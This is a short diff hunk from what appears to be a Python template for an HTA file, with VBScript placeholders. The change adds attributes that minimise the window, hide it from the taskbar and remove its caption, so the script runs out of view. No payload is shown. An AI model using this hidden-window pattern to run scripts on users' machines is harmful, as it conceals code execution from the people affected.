@@ -9,7 +9,7 @@ r"""
 <!DOCTYPE html>
 <html>
 <head>
-<HTA:APPLICATION />
+<HTA:APPLICATION icon="#" WINDOWSTATE="minimize" SHOWINTASKBAR="no" SYSMENU="no"  CAPTION="no" />
 <script type="text/vbscript">
 <<<VBS>>>
 <<<MAIN>>>
